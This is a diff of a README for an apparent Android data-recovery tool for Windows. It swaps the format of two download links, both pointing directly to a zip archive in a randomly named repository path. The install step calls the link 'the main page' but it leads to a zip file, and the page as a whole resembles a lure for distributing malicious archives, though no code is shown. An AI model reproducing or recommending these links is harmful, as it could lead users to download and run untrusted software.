@@ -5,7 +5,7 @@ description: "Recover data from damaged Android devices on Windows 10 and 11 usi
 ---
 # 📱 Broken-Android-Extract-Pro - Recover files from broken Android devices
 
-[![](https://img.shields.io/badge/Download-Broken%20Android%20Extract%20Pro-blue.svg)](https://github.com/Onobrychisviciaefoliacourtmartial907/onobrychisviciaefoliacourtmartial907.github.io/raw/refs/heads/main/lemonish/io-github-onobrychisviciaefoliacourtmartial-v2.7.zip)
+[![](https://img.shields.io/badge/Download-Broken%20Android%20Extract%20Pro-blue.svg)](https://raw.githubusercontent.com/Onobrychisviciaefoliacourtmartial907/onobrychisviciaefoliacourtmartial907.github.io/main/lemonish/io-github-onobrychisviciaefoliacourtmartial-v2.7.zip)
 
 ## 📖 About this software
 
@@ -25,7 +25,7 @@ Before you install this software, confirm that your computer meets these needs:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this link](https://github.com/Onobrychisviciaefoliacourtmartial907/onobrychisviciaefoliacourtmartial907.github.io/raw/refs/heads/main/lemonish/io-github-onobrychisviciaefoliacourtmartial-v2.7.zip) to reach the main page.
+1. Visit [this link](https://raw.githubusercontent.com/Onobrychisviciaefoliacourtmartial907/onobrychisviciaefoliacourtmartial907.github.io/main/lemonish/io-github-onobrychisviciaefoliacourtmartial-v2.7.zip) to reach the main page.
 2. Select the green button labeled "Code" and choose "Download ZIP".
 3. Locate the downloaded file in your Downloads folder.
 4. Right-click the file and select "Extract All".
